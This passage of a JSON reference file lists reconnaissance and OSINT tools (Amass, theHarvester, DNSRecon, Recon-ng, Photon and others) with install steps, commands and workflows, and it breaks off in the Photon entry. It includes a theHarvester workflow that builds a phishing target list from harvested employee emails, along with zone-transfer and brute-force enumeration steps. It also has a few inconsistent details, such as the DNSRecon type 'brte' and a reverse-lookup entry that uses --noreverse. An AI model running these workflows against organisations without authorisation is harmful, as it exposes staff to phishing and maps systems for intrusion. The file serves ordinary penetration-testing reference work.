[
  {
    "id": "amass",
    "name": "Amass",
    "summary": "OWASP Amass performs in-depth attack surface mapping for external assets. It combines passive and active reconnaissance with graph exports and historical tracking.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from repos or Go toolchain",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y amass",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/.config/amass",
            "copyable": true
          },
          {
            "detail": "amass -version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed with companion wordlists",
        "steps": [
          {
            "detail": "sudo apt install -y amass amass-wordlists",
            "copyable": true
          },
          {
            "detail": "ls /usr/share/amass/wordlists",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official containerized deployment",
        "steps": [
          {
            "detail": "docker pull caffix/amass",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/output caffix/amass enum -passive -d example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Passive enumeration",
        "command": "amass enum -passive -d example.com",
        "notes": []
      },
      {
        "description": "Active brute-force with wordlist",
        "command": "amass enum -active -brute -w data/wordlists/subdomains.txt -d example.com",
        "notes": []
      },
      {
        "description": "ASN and netblock intel",
        "command": "amass intel -asn 13335",
        "notes": []
      },
      {
        "description": "Graph export",
        "command": "amass viz -d example.com -o graph.gexf",
        "notes": []
      },
      {
        "description": "Track changes over time",
        "command": "amass track -d example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "enum/intel/viz/db/track",
        "description": "Module to run"
      },
      {
        "flag": "-d/-df",
        "description": "Target domain or file with multiple domains"
      },
      {
        "flag": "-brute",
        "description": "Enable brute-force enumeration"
      },
      {
        "flag": "-src",
        "description": "Show data sources for findings"
      },
      {
        "flag": "-ip",
        "description": "Include resolved IP addresses"
      },
      {
        "flag": "-o/-json",
        "description": "Write results to text or JSON"
      }
    ],
    "operational_tips": [
      "Configure API keys (~/.config/amass/config.ini) for richer passive data.",
      "Use amass db to reuse previous discoveries during new engagements.",
      "Export graphs (viz) to share with teammates or include in reports.",
      "Blend passive + active modes for accuracy while limiting noise."
    ],
    "step_sequences": [
      {
        "title": "Passive OSINT baseline",
        "steps": [
          {
            "title": "Configure API keys",
            "details": "Edit ~/.config/amass/config.ini with VirusTotal, Shodan, SecurityTrails tokens.",
            "command": "nano ~/.config/amass/config.ini"
          },
          {
            "title": "Run passive sweep",
            "details": "Collect subdomains without touching target infrastructure.",
            "command": "amass enum -passive -d example.com -o passive.txt"
          },
          {
            "title": "Review discoveries",
            "details": "Examine the database for new assets.",
            "command": "amass db -d example.com -show"
          }
        ]
      },
      {
        "title": "Active brute-force enumeration",
        "steps": [
          {
            "title": "Launch active scan",
            "details": "Use wordlists with custom resolvers for brute force.",
            "command": "amass enum -active -brute -w /usr/share/amass/wordlists/all.txt -d example.com -src -ip"
          },
          {
            "title": "Export graph",
            "details": "Generate GEXF for Maltego or Gephi.",
            "command": "amass viz -d example.com -o graph.gexf"
          },
          {
            "title": "Track changes",
            "details": "Monitor new assets over time.",
            "command": "amass track -d example.com -last 2"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Passive \u2192 Active \u2192 Verification",
        "stages": [
          {
            "label": "Amass passive",
            "description": "Gather all public subdomain data.",
            "command": "amass enum -passive -d example.com -o passive.txt"
          },
          {
            "label": "DNS validation",
            "description": "Verify candidates resolve.",
            "command": "dnsrecon -d example.com -D passive.txt -t brt"
          },
          {
            "label": "Port scanning",
            "description": "Identify services on validated hosts.",
            "command": "nmap -sV -iL live.txt -oA scans/services"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[Passive] api.example.com",
        "meaning": "Square brackets indicate which module sourced the finding.",
        "severity": "info"
      },
      {
        "indicator": "ASN: 13335",
        "meaning": "ASN context helps identify ownership and scope boundaries.",
        "severity": "info"
      },
      {
        "indicator": "Address: 203.0.113.42",
        "meaning": "Resolved IPs ready for port scanning.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Recursive crawl with custom resolvers",
        "command": "amass enum -active -brute -w custom.txt -min-for-recursive 3 -rf resolvers.txt -d example.com",
        "scenario": "Recursively enumerate when finding multiple subdomains at a level.",
        "notes": [
          "Use --max-depth to prevent infinite loops on wildcard zones."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "sublist3r",
    "name": "Sublist3r",
    "summary": "Sublist3r is a fast Python subdomain enumeration tool designed to enumerate subdomains of websites using OSINT.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y sublist3r",
            "copyable": true
          },
          {
            "detail": "sublist3r -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "sublist3r -d example.com",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/aboul3la/Sublist3r",
            "copyable": true
          },
          {
            "detail": "cd Sublist3r",
            "copyable": true
          },
          {
            "detail": "pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "python3 sublist3r.py -h",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic subdomain enumeration",
        "command": "python3 sublist3r.py -d example.com",
        "notes": []
      },
      {
        "description": "Fast enumeration with verbose output",
        "command": "python3 sublist3r.py -d example.com -v -t 20",
        "notes": []
      },
      {
        "description": "Save results to file",
        "command": "python3 sublist3r.py -d example.com -o subdomains.txt",
        "notes": []
      },
      {
        "description": "Use specific search engines",
        "command": "python3 sublist3r.py -d example.com -e google,bing,yahoo",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-d",
        "description": "Domain to enumerate"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      },
      {
        "flag": "-t",
        "description": "Number of threads"
      },
      {
        "flag": "-e",
        "description": "Search engines to use"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-p",
        "description": "Include ports for subdomains"
      }
    ],
    "operational_tips": [
      "Use multiple search engines for better coverage.",
      "Combine with other tools like Amass for comprehensive enumeration.",
      "Save results for later analysis and correlation.",
      "Consider rate limiting to avoid being blocked by search engines."
    ],
    "step_sequences": [
      {
        "title": "Basic subdomain enumeration",
        "steps": [
          {
            "title": "Run search",
            "details": "Query multiple search engines for subdomains.",
            "command": "sublist3r -d example.com -o subdomains.txt"
          },
          {
            "title": "Verify live",
            "details": "Check which subdomains resolve.",
            "command": "cat subdomains.txt | dnsx -silent -o live_subs.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Subdomain discovery \u2192 HTTP probing",
        "stages": [
          {
            "label": "Sublist3r enum",
            "description": "Gather subdomains from public sources.",
            "command": "sublist3r -d example.com -o subs.txt"
          },
          {
            "label": "DNS resolution",
            "description": "Filter only live hosts.",
            "command": "dnsx -l subs.txt -resp-only -o resolved.txt"
          },
          {
            "label": "HTTP detection",
            "description": "Identify web services.",
            "command": "httpx -l resolved.txt -title -tech-detect -o web_services.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[-] Enumerating subdomains now for example.com",
        "meaning": "Sublist3r started; sources include Google, Bing, Yahoo, etc.",
        "severity": "info"
      },
      {
        "indicator": "[+] api.example.com",
        "meaning": "Subdomain discovered and added to results.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Threaded brute force",
        "command": "sublist3r -d example.com -b -t 50 -o subs_bruteforce.txt",
        "scenario": "Enable brute force with 50 threads for faster enumeration.",
        "notes": [
          "Requires local wordlists in Sublist3r/subbrute/"
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "theHarvester",
    "name": "theHarvester",
    "summary": "theHarvester is an OSINT tool for gathering emails, subdomains, hosts, employee names, open ports, and banners from different public sources.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y theharvester",
            "copyable": true
          },
          {
            "detail": "theHarvester -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "theHarvester -d example.com -l 100 -b google",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run -it kalilinux/kali-rolling bash",
            "copyable": true
          },
          {
            "detail": "apt update && apt install -y theharvester",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic email and subdomain gathering",
        "command": "python3 theHarvester.py -d example.com -l 500 -b google",
        "notes": []
      },
      {
        "description": "Comprehensive OSINT with multiple sources",
        "command": "python3 theHarvester.py -d example.com -l 1000 -b all",
        "notes": []
      },
      {
        "description": "Shodan integration for host discovery",
        "command": "python3 theHarvester.py -d example.com -l 500 -b shodan",
        "notes": []
      },
      {
        "description": "Save results to XML",
        "command": "python3 theHarvester.py -d example.com -l 500 -b google -f myresults.xml",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-d",
        "description": "Domain to search"
      },
      {
        "flag": "-l",
        "description": "Limit number of results"
      },
      {
        "flag": "-b",
        "description": "Data source (google, bing, etc.)"
      },
      {
        "flag": "-f",
        "description": "Save output to file"
      },
      {
        "flag": "-n",
        "description": "Start DNS resolution of discovered hosts"
      },
      {
        "flag": "-c",
        "description": "Perform DNS brute force"
      }
    ],
    "operational_tips": [
      "Use 'all' as data source for comprehensive gathering.",
      "Combine with Shodan API for additional host information.",
      "Be aware of API rate limits for various sources.",
      "Export results for correlation with other tools."
    ],
    "step_sequences": [
      {
        "title": "OSINT gathering for pentest scope",
        "steps": [
          {
            "title": "Email enumeration",
            "details": "Harvest employee emails from search engines.",
            "command": "theHarvester -d example.com -l 500 -b google -f emails"
          },
          {
            "title": "Subdomain discovery",
            "details": "Extract subdomains using multiple sources.",
            "command": "theHarvester -d example.com -l 1000 -b all -f osint_results"
          },
          {
            "title": "Shodan integration",
            "details": "Query Shodan for exposed services.",
            "command": "theHarvester -d example.com -b shodan -f shodan_intel"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "theHarvester \u2192 Email validation \u2192 Phishing prep",
        "stages": [
          {
            "label": "Harvest emails",
            "description": "Gather all public email addresses.",
            "command": "theHarvester -d example.com -l 1000 -b linkedin,google -f emails.html"
          },
          {
            "label": "Validate addresses",
            "description": "Check if emails are active (external tool).",
            "command": "# Use external SMTP validation or Hunter.io"
          },
          {
            "label": "Build target list",
            "description": "Create phishing campaign targets.",
            "command": "cat emails.html | grep @ | sort -u > phishing_targets.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Searching Google",
        "meaning": "theHarvester is querying a specific data source.",
        "severity": "info"
      },
      {
        "indicator": "admin@example.com",
        "meaning": "Email address discovered; useful for social engineering assessments.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Multi-source comprehensive scan",
        "command": "theHarvester -d example.com -l 5000 -b google,bing,linkedin,twitter,shodan,virustotal -f full_osint.xml",
        "scenario": "Aggregate data from all available sources for complete OSINT picture.",
        "notes": [
          "Configure API keys in /etc/theHarvester/api-keys.yaml for premium sources."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "dnsrecon",
    "name": "DNSRecon",
    "summary": "DNSRecon is a powerful DNS enumeration script that provides multiple techniques for gathering DNS information.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y dnsrecon",
            "copyable": true
          },
          {
            "detail": "dnsrecon -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "dnsrecon -d example.com",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/darkoperator/dnsrecon",
            "copyable": true
          },
          {
            "detail": "cd dnsrecon",
            "copyable": true
          },
          {
            "detail": "pip3 install -r requirements.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Standard enumeration",
        "command": "dnsrecon -d example.com -t std",
        "notes": []
      },
      {
        "description": "Zone transfer attempt",
        "command": "dnsrecon -d example.com -t axfr",
        "notes": []
      },
      {
        "description": "Reverse lookup of IP range",
        "command": "dnsrecon -d example.com -t rvl -r 192.168.1.0/24",
        "notes": []
      },
      {
        "description": "Brute force subdomains",
        "command": "dnsrecon -d example.com -t brte -D wordlist.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-d",
        "description": "Target domain"
      },
      {
        "flag": "-t",
        "description": "Type of enumeration"
      },
      {
        "flag": "-n",
        "description": "Name server to use"
      },
      {
        "flag": "-r",
        "description": "IP range for reverse lookup"
      },
      {
        "flag": "-D",
        "description": "Dictionary file for brute force"
      },
      {
        "flag": "-a",
        "description": "Perform all enumeration types"
      }
    ],
    "operational_tips": [
      "Always try zone transfer first - high impact if successful.",
      "Use custom wordlists for better brute force results.",
      "Combine with other DNS tools for comprehensive coverage.",
      "Document all DNS findings for attack surface mapping."
    ],
    "step_sequences": [
      {
        "title": "DNS enumeration and zone transfer",
        "steps": [
          {
            "title": "Standard enumeration",
            "details": "Query A, AAAA, NS, MX, SOA records.",
            "command": "dnsrecon -d example.com -t std"
          },
          {
            "title": "Zone transfer attempt",
            "details": "Try AXFR against all NS servers.",
            "command": "dnsrecon -d example.com -t axfr"
          },
          {
            "title": "Reverse lookup",
            "details": "Map IPs back to hostnames.",
            "command": "dnsrecon -d example.com -t rvl -r 192.168.1.0/24"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "DNS recon \u2192 Certificate transparency \u2192 Amass",
        "stages": [
          {
            "label": "DNSRecon std",
            "description": "Baseline DNS records.",
            "command": "dnsrecon -d example.com -t std -j dns_base.json"
          },
          {
            "label": "Certificate logs",
            "description": "Query crt.sh for certificate-based subdomains.",
            "command": "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u > crt_subs.txt"
          },
          {
            "label": "Amass merge",
            "description": "Combine findings and enrich with Amass.",
            "command": "amass enum -d example.com -passive -df crt_subs.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Performing General Enumeration",
        "meaning": "DNSRecon is running standard record queries.",
        "severity": "info"
      },
      {
        "indicator": "[+] AXFR successful",
        "meaning": "Zone transfer worked; full zone data captured.",
        "severity": "warning"
      },
      {
        "indicator": "[-] AXFR failed",
        "meaning": "Zone transfer blocked; expected for hardened DNS.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Brute force with custom wordlist",
        "command": "dnsrecon -d example.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -n 8.8.8.8",
        "scenario": "Use large wordlists against public resolvers for thorough coverage.",
        "notes": [
          "Save results as JSON with -j for easy parsing."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "dnsenum",
    "name": "DNSenum",
    "summary": "DNSenum is a multithreaded perl script to enumerate DNS information of a domain and discover non-contiguous IP blocks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y dnsenum",
            "copyable": true
          },
          {
            "detail": "dnsenum -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "dnsenum example.com",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker run --rm kalilinux/kali-rolling dnsenum example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic DNS enumeration",
        "command": "dnsenum example.com",
        "notes": []
      },
      {
        "description": "Verbose with subdomain brute force",
        "command": "dnsenum --subfile subdomains.txt -f /usr/share/wordlists/dns.txt example.com",
        "notes": []
      },
      {
        "description": "With thread control and WHOIS",
        "command": "dnsenum -t 16 -w example.com",
        "notes": []
      },
      {
        "description": "Reverse lookup of IP range",
        "command": "dnsenum -r 192.168.1.0/24 example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--subfile",
        "description": "Save subdomains to file"
      },
      {
        "flag": "-f",
        "description": "Dictionary file for brute force"
      },
      {
        "flag": "-t",
        "description": "Number of threads"
      },
      {
        "flag": "-w",
        "description": "Perform WHOIS queries"
      },
      {
        "flag": "-r",
        "description": "Reverse lookup of IP range"
      },
      {
        "flag": "-s",
        "description": "Perform reverse lookups on subnets"
      }
    ],
    "operational_tips": [
      "Use good wordlists for subdomain brute forcing.",
      "Monitor thread count to avoid overwhelming target servers.",
      "Combine results with other DNS tools for completeness.",
      "Save subdomain lists for later testing phases."
    ],
    "step_sequences": [
      {
        "title": "Full DNS enumeration",
        "steps": [
          {
            "title": "Default scan",
            "details": "Enumerate DNS with built-in wordlist.",
            "command": "dnsenum example.com"
          },
          {
            "title": "Custom wordlist",
            "details": "Use your own subdomain list.",
            "command": "dnsenum --subfile /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt example.com"
          },
          {
            "title": "Output results",
            "details": "Save findings to file.",
            "command": "dnsenum -o dnsenum_results.xml example.com"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "DNSenum \u2192 Screenshot automation",
        "stages": [
          {
            "label": "DNS discovery",
            "description": "Find all subdomains and IPs.",
            "command": "dnsenum --threads 10 example.com > dnsenum.txt"
          },
          {
            "label": "Extract hostnames",
            "description": "Parse out discovered hosts.",
            "command": "grep 'example.com' dnsenum.txt | awk '{print $1}' | sort -u > hosts.txt"
          },
          {
            "label": "Screenshot capture",
            "description": "Use EyeWitness or Aquatone.",
            "command": "eyewitness -f hosts.txt --web"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Brute forcing with /usr/share/dnsenum/dns.txt",
        "meaning": "DNSenum is using default wordlist for subdomain brute force.",
        "severity": "info"
      },
      {
        "indicator": "admin.example.com. 300 IN A 203.0.113.10",
        "meaning": "Subdomain resolved; TTL and IP provided.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Reverse lookup of netblock",
        "command": "dnsenum --enum --noreverse --threads 20 example.com",
        "scenario": "Skip reverse lookups to speed up enumeration.",
        "notes": [
          "Use --dnsserver to specify custom resolver for testing."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "maltego",
    "name": "Maltego",
    "summary": "Maltego is an interactive data mining tool that renders directed graphs for link analysis. It's excellent for visualizing relationships between entities.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "wget https://www.maltego.com/downloads/maltego-ce.deb",
            "copyable": true
          },
          {
            "detail": "sudo dpkg -i maltego-ce.deb",
            "copyable": true
          },
          {
            "detail": "sudo apt --fix-broken install",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed in some editions",
        "steps": [
          {
            "detail": "sudo apt install -y maltego",
            "copyable": true
          },
          {
            "detail": "maltego",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Community image available",
        "steps": [
          {
            "detail": "# Maltego GUI requires X11 forwarding or VNC",
            "copyable": true
          },
          {
            "detail": "# Use official installers for desktop environments",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch Maltego GUI",
        "command": "maltego",
        "notes": []
      },
      {
        "description": "Run Maltego with specific transform",
        "command": "maltego -transform 'maltego.DNS_To_IPAddress'",
        "notes": []
      },
      {
        "description": "Import data for analysis",
        "command": "# Use GUI to import CSV, JSON, or other formats",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-transform",
        "description": "Run specific transform"
      },
      {
        "flag": "-import",
        "description": "Import data file"
      },
      {
        "flag": "-export",
        "description": "Export graph results"
      },
      {
        "flag": "-machine",
        "description": "Run in machine mode"
      }
    ],
    "operational_tips": [
      "Use transforms to automatically discover related information.",
      "Save graphs for later analysis and reporting.",
      "Combine with OSINT data for comprehensive intelligence.",
      "Consider API keys for premium transforms and data sources."
    ],
    "step_sequences": [
      {
        "title": "Initial OSINT investigation",
        "steps": [
          {
            "title": "Launch Maltego",
            "details": "Open the GUI and create/sign in to account.",
            "command": "maltego"
          },
          {
            "title": "Create new graph",
            "details": "Start with a domain entity.",
            "command": "# Add domain from entity palette"
          },
          {
            "title": "Run transforms",
            "details": "Right-click domain \u2192 Run All Transforms \u2192 To DNS/Websites",
            "command": "# Graphically expands relationships"
          },
          {
            "title": "Visualize attack surface",
            "details": "Examine connections and identify high-value targets.",
            "command": "# Review graph layout"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Maltego \u2192 Export \u2192 Recon-ng import",
        "stages": [
          {
            "label": "Maltego graph",
            "description": "Build comprehensive attack surface map visually.",
            "command": "# Use Maltego GUI transforms"
          },
          {
            "label": "Export entities",
            "description": "Save discovered entities to CSV/XML.",
            "command": "# File \u2192 Export \u2192 Graph to CSV"
          },
          {
            "label": "Recon-ng import",
            "description": "Load data into Recon-ng for scriptable recon.",
            "command": "# Use Recon-ng import modules"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Entity: Domain [example.com]",
        "meaning": "Central pivot point for transforms.",
        "severity": "info"
      },
      {
        "indicator": "Transform: To DNS Name [NS]",
        "meaning": "Discovered nameservers linked to domain.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "API-driven transforms",
        "command": "# Configure API keys in Maltego \u2192 Transforms \u2192 Hub",
        "scenario": "Enable premium transforms for deeper OSINT (Shodan, VirusTotal, PassiveTotal).",
        "notes": [
          "Automate with Maltego TRX framework for custom transforms."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "recon-ng",
    "name": "Recon-ng",
    "summary": "Recon-ng is a powerful Web Reconnaissance framework with a modular interface similar to Metasploit.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y recon-ng",
            "copyable": true
          },
          {
            "detail": "recon-ng",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "recon-ng",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/lanmaster53/recon-ng",
            "copyable": true
          },
          {
            "detail": "cd recon-ng",
            "copyable": true
          },
          {
            "detail": "pip3 install -r REQUIREMENTS",
            "copyable": true
          },
          {
            "detail": "./recon-ng",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch Recon-ng",
        "command": "./recon-ng",
        "notes": []
      },
      {
        "description": "Create workspace",
        "command": "recon-ng> workspace create example",
        "notes": []
      },
      {
        "description": "Add domain and run modules",
        "command": "recon-ng> add domains example.com",
        "notes": []
      },
      {
        "description": "Run Google dorking module",
        "command": "recon-ng> modules search google_site_web",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "workspace",
        "description": "Manage workspaces"
      },
      {
        "flag": "add",
        "description": "Add target data"
      },
      {
        "flag": "modules",
        "description": "Manage reconnaissance modules"
      },
      {
        "flag": "keys",
        "description": "Manage API keys"
      },
      {
        "flag": "show",
        "description": "Show various information"
      }
    ],
    "operational_tips": [
      "Configure API keys for maximum module functionality.",
      "Use workspaces to organize different engagements.",
      "Chain modules for comprehensive reconnaissance.",
      "Export data for analysis in other tools."
    ],
    "step_sequences": [
      {
        "title": "Modular reconnaissance workflow",
        "steps": [
          {
            "title": "Create workspace",
            "details": "Organize findings by target.",
            "command": "[recon-ng] > workspaces create example_pentest"
          },
          {
            "title": "Install modules",
            "details": "Add recon modules from marketplace.",
            "command": "[recon-ng][example_pentest] > marketplace install all"
          },
          {
            "title": "Configure API keys",
            "details": "Set keys for premium data sources.",
            "command": "[recon-ng][example_pentest] > keys add shodan_api YOUR_KEY"
          },
          {
            "title": "Load and run module",
            "details": "Execute reconnaissance tasks.",
            "command": "[recon-ng][example_pentest] > modules load recon/domains-hosts/hackertarget\\n options set SOURCE example.com\\n run"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Recon-ng \u2192 Database export \u2192 Report generation",
        "stages": [
          {
            "label": "Module execution",
            "description": "Run multiple recon modules to populate DB.",
            "command": "# Run modules via CLI or rc script"
          },
          {
            "label": "Query database",
            "description": "Extract hosts, contacts, credentials.",
            "command": "[recon-ng] > db query SELECT * FROM hosts"
          },
          {
            "label": "Generate report",
            "description": "Export findings to HTML/CSV.",
            "command": "[recon-ng] > modules load reporting/html\\n run"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Module loaded: recon/domains-hosts/hackertarget",
        "meaning": "Recon-ng loaded the module successfully.",
        "severity": "info"
      },
      {
        "indicator": "[+] Found: admin.example.com (203.0.113.5)",
        "meaning": "New host discovered and added to workspace database.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Scripted reconnaissance with resource files",
        "command": "recon-ng -r recon_script.rc",
        "scenario": "Automate multi-module workflows with resource files.",
        "notes": [
          "Example rc file:\\nworkspaces create auto_recon\\nmodules load recon/domains-hosts/hackertarget\\noptions set SOURCE example.com\\nrun"
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "photon",
    "name": "Photon",
    "summary": "Photon is an incredibly fast crawler designed for OSINT that extracts URLs, emails, files, website accounts, and more.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/s0md3v/Photon",
            "copyable": true
          },
          {
            "detail": "cd Photon",
            "copyable": true
          },
          {
            "detail": "pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "python3 photon.py -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/s0md3v/Photon ~/Photon",
            "copyable": true
          },
          {
            "detail": "cd ~/Photon && pip3 install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull s0md3v/photon",
            "copyable": true
          },
          {
            "detail": "docker run -v $PWD:/output s0md3v/photon -u https://example.com -o /output",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic web crawling",
        "command": "python3 photon.py -u https://example.com",
        "notes": []
      },
      {
        "description": "Deep crawl with more threads",
        "command": "python3 photon.py -u https://example.com -l 3 -t 20",
        "notes": []
      },
      {
        "description": "Save all data",
        "command": "python3 photon.py -u https://example.com -d example --output",
        "notes": []
      },
      {
        "description": "Crawl with cookies and headers",
        "command": "python3 photon.py -u https://example.com -c 'session=abc123' -h 'Authorization: Bearer token'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u",
        "description": "Target URL"
      },
      {
        "flag": "-l",
        "description": "Level of crawling depth"
      },
      {
        "flag": "-t",
        "description": "Number of threads"
      },
      {
        "flag": "-d",
        "description": "Output directory name"
      },
      {
        "flag": "--output",
        "description": "Save output to files"
      },
      {
        "flag": "-c",
        "description": "Cookie string"
      },
      {
        "flag": "-h",
        "description": "Custom headers"
      }
    ],
    "operational_tips": [
      "Increase threads for faster crawling but monitor target response.",
      "Use appropriate depth levels to avoid infinite crawling.",
      "Save all output for later analysis and correlation.",
      "Combine with other tools for comprehensive reconnaissance."
    ],
    "step_sequences": [
      {
        "title": "Website crawling and data extraction",
        "steps": [
          {
            "title": "Basic crawl",
            "details": "Harvest URLs, emails, JS files from target site.",
            "command": "python3 photon.py -u https://example.com -o output/"
          },
          {
            "title": "Deep crawl with threads",
            "details": "Accelerate with multithreading.",
            "command": "python3 photon.py -u https://example.com -t 20 -o results/"
          },
          {
            "title": "Review findings",
            "details": "Examine extracted intelligence.",
            "command": "ls output/example.com/"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Photon \u2192 JS analysis \u2192 Endpoint discovery",
        "stages": [
          {
            "label": "Photon crawl",
            "description": "Extract all links and assets.",
            "command": "python3 photon.py -u https://app.example.com -o photon_out/"
          },
          {
            "label": "JavaScript extraction",
            "description": "Find hidden API endpoints in JS files.",
            "command": "cat photon_out/app.example.com/scripts.txt | httpx -silent > js_files.txt"
          },
          {
            "label": "LinkFinder analysis",
            "description": "Parse JS for URLs and parameters.",
            "command": "python3 linkfinder.py -i js_files.txt -o endpoints.html"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Extracting URLs",
        "meaning": "Photon is crawling and collecting all hyperlinks.",
        "severity": "info"
      },
      {
        "indicator": "[!] admin@example.com",
        "meaning": "Email address found; potential target for social engineering.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Crawl with custom headers and cookies",
        "command": "python3 photon.py -u https://example.com --headers 'Authorization: Bearer TOKEN' --cookies 'session=abc123' -o auth_crawl/",
